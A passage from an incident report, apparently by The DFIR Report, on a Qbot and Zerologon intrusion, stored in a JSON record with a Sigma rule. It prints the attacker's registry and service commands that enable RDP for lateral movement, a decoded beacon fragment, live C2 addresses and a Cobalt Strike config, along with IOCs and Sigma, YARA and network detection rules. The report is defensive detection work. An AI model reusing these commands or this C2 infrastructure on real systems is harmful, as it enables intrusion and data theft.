hosts:\n\nIncrease the max RDP connections allowed, in this case a arbitrarily large number.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f\n```\n\nMakes sure the RDP listener is enabled.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"fEnableWinStation\" /d 1 /f\n```\n\nMakes sure the user is allowed to RDP to the terminal server.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSUserEnabled\" /d 0 /f\n```\n\nMakes sure the terminal server is set to enabled.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSEnabled\" /d 1 /f\n```\n\nMakes sure terminal services is set to remote admin mode.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAppCompat\" /d 0 /f\n```\n\nMakes sure that the terminal service will start idle sessions.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"IdleWinStationPoolCount\" /d 1 /f\n```\n\nEnables advertisement of the terminal server.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAdvertise\" /d 1 /f\n```\n\nMakes sure terminal server is set to allow connections.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"AllowTSConnections\" /d 1 /f\n```\n\nMakes sure terminal server is set to simultaneous sessions.\n\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /t REG_DWORD /v \"EnableConcurrentSessions\" /d 1 /f\n```\n\nStarts the terminal services and sets service to autostart.\n\n```\nsc config termservice start= auto\nnet  start termservice /y\n```\n\nThe threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.\n\n```image\nAlt: RDP Sessions\nDescription: The image displays a detailed security log entry from a Windows environment, indicating a successful logon event (EventCode=4624) related to Remote Desktop Protocol (RDP). It includes specific logon information such as the security ID, account name, account domain, logon type, and process information. The log indicates that an account was successfully logged on, with notable details about the administrator account used, including its security ID, logon ID, and the process associated with the logon (svchost.exe). This log serves as a crucial piece of information in the context of lateral movement and potential domain compromise scenarios.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=************\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=12572\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID: S-1-5-18\n      Account Name: ************\n      Account Domain: ************\n      Logon ID: 0x3E7\n  \n  Logon Information:\n      Logon Type: 10\n      Restricted Admin Mode: No\n      Virtual Account: No\n      Elevated Token: Yes\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n      Security ID: S-1-5-21-853439379-3680187918-914908032-500\n      Account Name: Administrator\n      Account Domain: ************\n      Logon ID: 0x1213E97\n      Linked Logon ID: 0x0\n      Network Account Name: -\n      Network Account Domain: -\n      Logon GUID: {56eb6b07-4091-d736-d28e-f8ef8d0dc9158}\n  \n  Process Information:\n      Process ID: 0x3c\n      Process Name: C:\\Windows\\System32\\svchost.exe\n```\n\n```\nLogName=Security\nEventCode=4624\nLogon Type=10 (Remote Interactive Logon - RDP)\n```\n\n### Named pipe (SMB)\n\nThe base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe “dce_3d”.\n\n```image\nAlt: SMB Beacon\nDescription: The image shows the output of a CyberChef operation, displaying a base64 decoded payload. The highlighted portion indicates the creation of a named pipe named \"dce_3d\". The surrounding text contains garbled data, typical of decoded binary payloads, potentially representing an SMB beacon.\nTranscription: |\n  üè....`à1òd.R0.R..R.r( .J&1y1A¬<a|, ÁÏ\n  ,ÇàRW.R..B<.D.@x.AtJ.DP.H..X .óá<1.4..Ó1y1¬ÁÍ\n  .Cçàu0.j; }$uÀ.xS.6f.K.x..ó...D.$$$[[ayZQyàX_Z..ë.1]Àj@h....hyÿ..j.hX¤SâyÖPé´...z1éQqh.°..h..°j.j.RhEpÔyÖP..$i.Rh(o)áyÖ.Atnj.j.j..æ.Æ..Â.|$..9At.hòµçVyÖyd$.èsyÿ\\\\.\\pipe\\dce_3d .i .\n```\n\n```image\nAlt: Named Pipe\nDescription: The image displays a log entry related to the creation of a named pipe in a Windows environment. It contains various fields such as LogName, EventCode, ComputerName, User, and more, with specific values indicating the details of the event. Notably, it shows that a pipe named '\\dce_3d' was created by a process with ID 396, which is associated with PowerShell. The log entry format is typical for Windows event logs, providing crucial information for cybersecurity analysis.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=17\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=43747\n  Keywords=None\n  TaskCategory=Pipe Created (rule: PipeEvent)\n  OpCode=Info\n  Message=Pipe Created:\n  RuleName=-\n  EventType=CreatePipe\n  UtcTime=\n  ProcessGuid={3acf9a2a-953e-6192-cd20-00000000000300}\n  ProcessId=396\n  PipeName=\\dce_3d\n  Image: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n```\nLogName=Microsoft-Windows-System/Operational\nEventCode=17\nTaskCategory=Pipe Created (rule: PipeEvent)\n```\n\n### Command and Control\n\n#### QBot details – 24.229.150.54 // 41.228.22.180\n\n24.229.150[.]54:995 / avlhestito[.]us\n\n```\nCertificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce\nNot Before  2021/11/15 09:24:49 UTC\nNot After  2022/11/15 13:18:32 UTC\nIssuer Org  Rsc Inpye LLC.\nSubject Common  avlhestito[.]us\nPublic Algorithm  rsaEncryption\nJA3: c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\n41.228.22[.]180:443 / xrhm[.]info\n\n```\nCertificate:\t96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7\nNot \tBefore:  2021/11/12 04:34:10 UTC\nNot After:  \t2022/11/12 10:08:57 UTC\nIssuer Org:  Bqatra Bamito Inc.\nSubject Common:  xrhm[.]info\nPublic Algorithm:  rsaEncryption\nJA3:  c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\nHere is the initial access DLL (Qbot) information from Tria.ge\n\n```image\nAlt: Qbot DLL\nDescription: The image displays a table containing details about Qakbot (QBot) operations. It includes columns for Family, Version, Botnet, Campaign, and a list of Command and Control (C2) IP addresses with their corresponding ports. Each row represents a different C2 address associated with Qakbot, showcasing the botnet's operational infrastructure.\nTranscription: |\n  Family: qakbot\n  Version: 402.363\n  Botnet: tr\n  Campaign: 1633597626\n  \n  C2:\n  120.150.218.241:995\n  89.137.52.44:443\n  86.8.177.143:443\n  174.54.139.186:443\n  188.50.169.158:443\n  140.82.49.12:443\n  81.241.252.59:2078\n  209.50.20.255:443\n  200.232.214.222:995\n  2.222.167.138:443\n  122.11.220.212:2222\n  47.22.148.6:443\n  217.17.56.163:465\n  94.200.181.154:443\n  201.93.111.2:995\n  89.101.97.139:443\n  188.55.235.118:995\n  181.118.183.94:443\n  186.32.163.199:443\n  76.25.142.196:443\n  98.157.235.126:443\n  73.151.236.31:443\n  75.75.179.226:443\n  67.165.206.193:993\n  72.252.201.69:443\n  185.250.148.74:443\n  66.103.170.104:2222\n  216.201.162.158:443\n  103.123.42.115:2222\n  124.123.42.115:2222\n  199.27.127.129:443\n  209.142.97.161:995\n  73.236.205.91:443\n  103.142.10.177:443\n  41.228.22.180:443\n  78.191.58.219:995\n  74.72.237.54:443\n  96.57.188.174:2078\n  37.210.152.224:995\n  202.134.178.157:443\n  73.52.50.32:443\n  27.223.92.142:995\n  136.236.74.70:443\n  72.173.78.211:443\n  45.46.53.140:2222\n  173.21.10.71:2222\n  71.74.12.34:443\n  167.48.117.81:443\n  47.40.196.233:2222\n  181.4.53.6:465\n```\n\n#### Cobalt Strike details – 5.255.98[.]144\n\nThis Cobalt Strike server was added to our Threat Feed on 2021-11-16.\n\n5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com\n\n```\nCertificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ]\nNot Before: 2021/11/07 03:00:53 UTC  \t\nNot After: 2022/02/05 03:00:52 UTC  \t\nIssuer Org: Let's Encrypt  \t\nSubject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com\nPublic Algorithm: rsaEncryption\nJA3: 0eecb7b1551fba4ec03851810d31743f\nJA3s: ae4edc6faf64d08308082ad26be60767\n```\n\nConfig:\n\n```\n{\n    \"x64\": {\n        \"uri_queried\": \"/tRPG\",\n        \"sha256\": \"dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416040175.3,\n        \"md5\": \"30cc71d5b5d7778774c54486558690d3\",\n        \"sha1\": \"5f36c6cffdbae0d631c8889b4d9bad1248f899b3\"\n    },\n    \"x86\": {\n        \"uri_queried\": \"/Mr0m\",\n        \"sha256\": \"a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416038974.9,\n        \"md5\": \"c1fd49c043894c1dff8bc02b17f8942c\",\n        \"sha1\": \"e915f74be310b1687db6b290af2f78583a981512\"\n    }\n}\n```\n\n### Exfiltration\n\nWhile the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment.\n\n```image\nAlt: Canary Documents\nDescription: The image displays a code snippet featuring details about an IP address (91.193.182.165). It includes information such as city (Moscow), region (Moscow), country (RU), geographical coordinates, organization (AS12722 RECONN LLC), postal code (101000), and timezone (Europe/Moscow). This data is relevant for identifying the origin of suspicious activities in a cybersecurity context.\nTranscription: |\n  ip: \"91.193.182.165\"\n  city: \"Moscow\"\n  region: \"Moscow\"\n  country: \"RU\"\n  loc: \"55.7522,37.6156\"\n  org: \"AS12722 RECONN LLC\"\n  postal: \"101000\"\n  timezone: \"Europe/Moscow\"\n```\n\nThe threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.\n\nThe C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.\n\n```image\nAlt: C2 Channel\nDescription: The image is a bar graph depicting the number of connections per minute from a File Server to a specified command and control IP address (5.255.98.144:8888). The x-axis represents time in UTC from 17:35 to 18:15, while the y-axis indicates the number of connections, ranging from 0 to 20. The graph shows a notable spike in connections at 17:54, which aligns with the timeframe of suspected data exfiltration, demonstrating the activity of a Cobalt Strike Beacon during that period.\nTranscription: |\n  Number of connection to 5.255.98.144:8888 from File Server per minute\n  \n  | Time  | Connections |\n  |-------|-------------|\n  | 17:36 | 1           |\n  | 17:37 | 0           |\n  | 17:38 | 0           |\n  | 17:39 | 5           |\n  | 17:40 | 0           |\n  | 17:41 | 0           |\n  | 17:42 | 0           |\n  | 17:43 | 0           |\n  | 17:44 | 0           |\n  | 17:45 | 0           |\n  | 17:46 | 0           |\n  | 17:47 | 0           |\n  | 17:48 | 0           |\n  | 17:49 | 0           |\n  | 17:50 | 0           |\n  | 17:51 | 0           |\n  | 17:52 | 0           |\n  | 17:53 | 0           |\n  | 17:54 | 18          |\n  | 17:55 | 16          |\n  | 17:56 | 14          |\n  | 17:57 | 12          |\n  | 17:58 | 10          |\n  | 17:59 | 10          |\n  | 18:00 | 10          |\n  | 18:01 | 10          |\n  | 18:02 | 10          |\n  | 18:03 | 10          |\n  | 18:04 | 10          |\n  | 18:05 | 10          |\n  | 18:06 | 10          |\n  | 18:07 | 10          |\n  | 18:08 | 10          |\n  | 18:09 | 10          |\n  | 18:10 | 10          |\n  | 18:11 | 10          |\n  | 18:12 | 10          |\n```\n\nAt 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.\n\nAccording to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.\n\n```image\nAlt: Exfiltration Traffic\nDescription: The image is a time series graph displaying network traffic data related to exfiltration events. The x-axis represents time in UTC, ranging from 17:52:00 to 18:00:00, while the y-axis indicates the volume of data transferred. A significant spike is visible around 17:54:00, indicating a peak in traffic from the file share server to the Cobalt Strike command and control server. The graph uses red bars to highlight the data transfer volumes, suggesting a concentrated effort of data exfiltration occurring within this time frame.\nTranscription: |\n  | Time (UTC) | Connections |\n  |------------|-------------|\n  | 17:52:00   | Low         |\n  | 17:54:00   | High        |\n  | 17:56:00   | Low         |\n  | 17:58:00   | Low         |\n  | 18:00:00   | Low         |\n```\n\nSpike in traffic from file share server to Cobalt Strike command and control server.\n\n### IOCs\n\n#### Network\n\n```\nQBOT\n24.229.150[.]54:995  - avlhestito[.]us\n41.228.22[.]180:443 - xrhm[.]info\n\nCobalt Strike\n5.255.98[.]144:8888 / dxabt[.]com\n5.255.98[.]144:443 / dxabt[.]com\n5.255.98[.]144:8080 / dxabt[.]com\n```\n\n#### File\n\n```\nIntial Exec Qbot DLL\nMD5:53510e20efb161d5b71c4ce2800c1a8d\nSHA1:2268178851d0d0debb9ab457d73af8a5e50af168\nSHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\n\nQBot DLL (extracted from registry):\nMD5:312e52b4109741893f17bc524084100f\nSHA1:7ca650945223eab088f43fd472e3592be2ed9d32\nSHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\n\ncool.exe\nMD5:59E7F22D2C290336826700F05531BD30\nSHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1\nSHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0\n```\n\n## Detections\n\n### Network\n\n```\nET POLICY Powershell Activity Over SMB - Likely Lateral Movement\nET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\nET CNC Feodo Tracker Reported CnC Server group 15\nET CNC Feodo Tracker Reported CnC Server group 16\n\nThe following rules may cause performance issues (and are disabled by default) according to @ET_Labs\nET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870\nET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889\n```\n\nNew signatures\n\n```\n2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)\n2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472)\n```\n\n### Sigma\n\n```\ntitle: Scheduled task executing powershell encoded payload from registry\nstatus: Experimental\ndescription: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/Create'\n      - '/SC'\n  selection2:\n    CommandLine|contains|all:\n      - 'FromBase64String'\n      - 'powershell'\n      - 'Get-ItemProperty'\n      - 'HKCU:'\n  condition: selection1 and selection2\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.t1053.005\n  - attack.t1059.001\n```\n\n```\ntitle: Execution of ZeroLogon PoC executable\nstatus: Experimental\ndescription: Detects the execution of the commonly used ZeroLogon PoC executable.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    ParentImage|endswith:\n      - '\\cmd.exe'\n    Image|endswith:\n      - '\\cool.exe'\n      - '\\zero.exe'\n    CommandLine|contains|all:\n      - 'Administrator'\n      - '-c'\n  selection2:\n    CommandLine|contains|all:\n      - 'taskkill'\n      - '/f'\n      - '/im'\n  selection3:\n    CommandLine|contains:\n      - 'powershell'\n  condition: selection1 and (selection2 or selection3)\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.lateral_movement\n  - attack.T1210\n```\n\n```\ntitle:  Enabling RDP service via reg.exe command execution\nstatus: Experimental\ndescription: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith:\n      - '\\reg.exe'\n    CommandLine|contains|all:\n      - 'add'\n      - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server'\n      - 'REG_DWORD'\n  Winstations1:\n    CommandLine|contains:\n      - 'WinStations\\RDP-Tcp'\n  Winstations2:\n    CommandLine|contains:\n      - 'MaxInstanceCount'\n      - 'fEnableWinStation'\n  selection2:\n    CommandLine|contains|all:\n      - 'Licensing Core'\n      - 'EnableConcurrentSessions'\n  selection3:\n    CommandLine|contains:\n      - 'TSUserEnabled'\n      - 'TSEnabled'\n      - 'TSAppCompat'\n      - 'IdleWinStationPoolCount'\n      - 'TSAdvertise'\n      - 'AllowTSConnections'\n      - 'fSingleSessionPerUser'\n  condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3))\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.defense_evasion\n  - attack.lateral_movement\n  - attack.t1021.001\n  - attack.t1112\n```\n\n- https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml\n- https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml\n\n### Yara\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2022-02-20\n   Identifier: Case 8734\n   Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule qbot_8734_payload_dll {\n   meta:\n      description = \"files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2022-02-20\"\n      hash1 = \"e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n   strings:\n      $s1 = \"Terfrtghygine.dll\" fullword ascii\n      $s2 = \"Winamp can read extended metadata for titles. Choose when this happens:\" fullword wide /* Goodware String - occured 1 times */\n      $s3 = \"Read metadata when file(s) are loaded into Winamp\" fullword wide /* Goodware String - occured 1 times */\n      $s4 = \"Use advanced title formatting when possible\" fullword wide /* Goodware String - occured 1 times */\n      $s5 = \"PQVW=!?\" fullword ascii\n      $s6 = \"Show underscores in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s7 = \"Advanced title display format :\" fullword wide /* Goodware String - occured 1 times */\n      $s8 = \"CreatePaint\" fullword ascii\n      $s9 = \"PQRVW=2\\\"\" fullword ascii\n      $s10 = \"Advanced Title Formatting\" fullword wide /* Goodware String - occured 1 times */\n      $s11 = \"Read metadata when file(s) are played or viewed in the playlist editor\" fullword wide /* Goodware String - occured 1 times */\n      $s12 = \"Show '%20's in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s13 = \"Example : \\\"%artist% - %title%\\\"\" fullword wide /* Goodware String - occured 1 times */\n      $s14 = \"PQRVW=g\" fullword ascii\n      $s15 = \"PQRW=e!\" fullword ascii\n      $s16 = \"ATF Help\" fullword wide /* Goodware String - occured 1 times */\n      $s17 = \"(this can be slow if a large number of files are added at once)\" fullword wide /* Goodware String - occured 1 times */\n      $s18 = \"PQRVW=$\" fullword ascii\n      $s19 = \"Metadata Reading\" fullword wide /* Goodware String - occured 1 times */\n      $s20 = \"Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ...\" fullword wide /* Goodware String - occured 1 times */\n   condition:\n      uint16(0) == 0x5a4d and filesize < 2000KB and\n      ( pe.imphash() == \"aa8a9db10fba890f8ef9edac427eab82\" and pe.exports(\"CreatePaint\") or 8 of them )\n}\n\nrule qbot_dll_8734 {\n   meta:\n      description = \"files - qbot.dll\"\n      author = \"TheDFIRReport\"\n      reference = \"QBOT_DLL\"\n      date = \"2021-12-04\"\n      hash1 = \"4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\"\n   strings:\n      $s1 = \"Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc\" wide\n      $s2 = \"IDAPI32.DLL\" fullword ascii\n      $s3 = \"ResetUsageDataActnExecute\" fullword ascii\n      $s4 = \"idapi32.DLL\" fullword ascii\n      $s5 = \"ShowHintsActnExecute\" fullword ascii\n      $s6 = \"OnExecute@iG\" fullword ascii\n      $s7 = \"OnExecutexnD\" fullword ascii\n      $s8 = \"ShowShortCutsInTipsActnExecute\" fullword ascii\n      $s9 = \"ResetActnExecute \" fullword ascii\n      $s10 = \"RecentlyUsedActnExecute\" fullword ascii\n      $s11 = \"LargeIconsActnExecute\" fullword ascii\n      $s12 = \"ResetActnExecute\" fullword ascii\n      $s13 = \"OnExecute<\" fullword ascii\n      $s14 = \"TLOGINDIALOG\" fullword wide\n      $s15 = \"%s%s:\\\"%s\\\";\" fullword ascii\n      $s16 = \":\\\":&:7:?:C:\\\\:\" fullword ascii /* hex encoded string '|' */\n      $s17 = \"LoginPrompt\" fullword ascii\n      $s18 = \"TLoginDialog\" fullword ascii\n      $s19 = \"OnLogin\" fullword ascii\n      $s20 = \"Database Login\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 3000KB and\n      8 of the\n```\n\n## MITRE\n\n- Exploitation for Privilege Escalation – T1068\n- Service Execution – T1569.002\n- Network Share Discovery – T1135\n- Pass the Hash – T1550.002\n- PowerShell – T1059.001\n- Windows Command Shell – T1059.003\n- Network Share Discovery – T1135\n- Obfuscated Files or Information – T1027\n- Scheduled Task – T1053.005\n- Process Injection – T1055\n- Remote System Discovery – T1018\n- Obfuscated Files or Information – T1027\n- Domain Trust Discovery – T1482\n- Domain Groups – T1069.002\n- System Owner/User Discovery – T1033\n- Network Share Discovery – T1135\n- Remote Services – T1021\n- Local Account – T1087.001\n- Security Software Discovery – T1518.001\n\n```image\nAlt: MITRE ATT&CK\nDescription: The image is a flowchart detailing the relationships and tactics used in a cyber attack scenario involving Qbot and Zerologon. It is structured according to the MITRE ATT&CK framework, illustrating various tactics and techniques such as initial access, execution, privilege escalation, lateral movement, discovery, command and control, and exfiltration. Each tactic is accompanied by specific techniques and associated tools, such as Cobalt Strike, PowerShell, and others. The flowchart visually organizes these components, highlighting how they connect to lead to a full domain compromise.\nTranscription: |\n  TA0001: Initial Access\n      T1566.001: Phishing: Spearphishing Attachment -> Qbot\n  \n  TA0002: Execution\n      T1059.001: Command and Scripting Interpreter: PowerShell\n      T1059.003: Command and Scripting Interpreter: Windows Command Shell -> Cobalt Strike\n      T1569: System Services\n  \n  TA0004: Privilege Escalation\n      T1078.002: Valid Accounts: Domain Accounts\n      T1086: Exploitation for Privilege Escalation -> Zerologon\n  \n  TA0005: Defense Evasion\n      T1055: Process Injection -> Cobalt Strike\n  \n  TA0003: Persistence\n      T1053.005: Scheduled Task/Job: Scheduled Task\n  \n  TA0008: Lateral Movement\n      T1021.002: Remote Services: SMB/Windows Admin Shares -> Cobalt Strike\n      T1021.001: Remote Services: Remote Desktop Protocol\n  \n  TA0007: Discovery\n      T1518.001: Software Discovery: Security Software Discovery -> wmic\n      T1018: Remote System Discovery -> Ping\n      T1087.002: Account Discovery: Domain Account -> ADFind\n      T1135: Network Share Discovery -> Net View\n      T1069.001: Permission Groups Discovery: Local Groups\n      T1069: Permission Groups Discovery: Domain Groups -> Net Group\n      T1482: Domain Trust Discovery -> Ntest\n  \n  TA0011: Command and Control\n      T1071: Application Layer Protocol -> Cobalt Strike and Qbot\n  \n  TA0010: Exfiltration\n      T1041: Exfiltration over C2 Channel -> Documents from File Share Server and Cobalt Strike\n```",
    "sigma_rule": {
      "title": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
      "id": "0d5675be-bc88-4172-86d3-1e96a4476536",
      "status": "test",
      "description": "Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "pH-T (Nextron Systems), @Kostastsale, TheDFIRReport",
      "date": "2022-02-12",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.lateral-movement",
        "attack.t1021.001",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_main_img": [
          {
            "Image|endswith": "\\reg.exe"
          },
          {
            "OriginalFileName": "reg.exe"
          }
        ],
        "selection_main_cli": {
          "CommandLine|contains|all": [
            " add ",
            "\\CurrentControlSet\\Control\\Terminal Server",
            "REG_DWORD",
            " /f"
          ]
        },
        "selection_values_1": {
          "CommandLine|contains|all": [
            "Licensing Core",
            "EnableConcurrentSessions"
          ]
        },
        "selection_values_2": {
          "CommandLine|contains": [
            "WinStations\\RDP-Tcp",
            "MaxInstanceCount",
            "fEnableWinStation",
            "TSUserEnabled",
            "TSEnabled",
            "TSAppCompat",
            "IdleWinStationPoolCount",
            "TSAdvertise",
            "AllowTSConnections",
            "fSingleSessionPerUser",
            "fDenyTSConnections"
          ]
        },
        "condition": "all of selection_main_* and 1 of selection_values_*"
      },
      "falsepositives": [
